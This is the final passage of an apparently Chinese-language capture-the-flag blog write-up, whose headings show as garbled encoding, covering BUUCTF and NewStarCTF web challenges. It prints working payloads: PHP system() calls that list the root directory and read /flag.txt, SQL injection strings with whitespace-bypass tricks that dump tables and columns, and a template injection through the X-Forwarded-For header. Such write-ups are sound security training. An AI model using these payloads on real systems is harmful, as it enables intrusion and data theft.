<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">cmd=system(&#x27;ls /&#x27;);<br>cmd=system(&#x27;cat /flag.txt&#x27;);<br></code></pre></td></tr></table></figure>

<h3 id="40ã€-NewStarCTF-å…¬å¼€èµ›èµ›é“-åˆä¸€ä¸ªSQL"><a href="#40ã€-NewStarCTF-å…¬å¼€èµ›èµ›é“-åˆä¸€ä¸ªSQL" class="headerlink" title="40ã€[NewStarCTF å…¬å¼€èµ›èµ›é“]åˆä¸€ä¸ªSQL"></a>40ã€[NewStarCTF å…¬å¼€èµ›èµ›é“]åˆä¸€ä¸ªSQL</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#çˆ†è¡¨å<br>name=-1%0bunion%0bselect%0b(select%0bgroup_concat(table_name)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=database()),2; <br>#çˆ†åˆ—å<br>name=-1%0bunion%0bselect%0b(select%0bgroup_concat(column_name)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#x27;wfy_comments&#x27;),2;<br># çˆ†å­—æ®µ<br>-1%0bunion%0bselect%0b(select%0bgroup_concat(id,text,user,name,display)%0bfrom%0bwfy_comments%0blimit%0b0,1),2;<br></code></pre></td></tr></table></figure>

<h3 id="41ã€-BJDCTF2020-The-mystery-of-ip"><a href="#41ã€-BJDCTF2020-The-mystery-of-ip" class="headerlink" title="41ã€[BJDCTF2020]The mystery of ip"></a>41ã€[BJDCTF2020]The mystery of ip</h3><p>æ‰¾åˆ°æç¤º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&lt;!-- Do you know why i know your ip? --&gt;<br></code></pre></td></tr></table></figure>

<p>å‘ç°æ˜¯è¯·æ±‚å¤´å­˜åœ¨æ³¨å…¥</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">X-Forwarded-For:&#123;&#123;system(&#x27;ls /&#x27;)&#125;&#125;<br></code></pre></td></tr></table></figure>
    
  </article>

  
      
    <div class="nexmoe-post-copyright">
        <strong>æœ¬æ–‡ä½œè€…ï¼š</strong>å¥½çš„<br>
        <strong>æœ¬æ–‡é“¾æ¥ï¼š</strong><a href="http://xxxkkk578.github.io/2024/04/09/buu_web/" title="http:&#x2F;&#x2F;xxxkkk578.github.io&#x2F;2024&#x2F;04&#x2F;09&#x2F;buu_web&#x2F;" target="_blank" rel="noopener">http:&#x2F;&#x2F;xxxkkk578.github.io&#x2F;2024&#x2F;04&#x2F;09&#x2F;buu_web&#x2F;</a><br>
        
            <strong>ç‰ˆæƒå£°æ˜ï¼š</strong>æœ¬æ–‡é‡‡ç”¨ <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/cn/deed.zh" target="_blank">CC BY-NC-SA 3.0 CN</a> åè®®è¿›è¡Œè®¸å¯

        
    </div>


  
  
  <div class="nexmoe-post-meta nexmoe-rainbow">
   
    
        <a class="nexmoefont icon-tag-fill -none-link" href="/tags/CTF-Web/" rel="tag">CTF,Web</a>
    
</div>
  
  
    <script async src="/js/copy-codeblock.js?v=1721993444655"></script>
  

  
      <div class="nexmoe-post-footer">
          
      </div>
  
</div></div><div class="nexmoe-post-right">    <div class="nexmoe-fixed">
        <div class="nexmoe-tool">

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="æœç´¢" onInput="sinput();"></div><a class="search-close" onclick="sclose();">Ã—</a></div><div class="search-body"></div></div></div><div></div></body></html>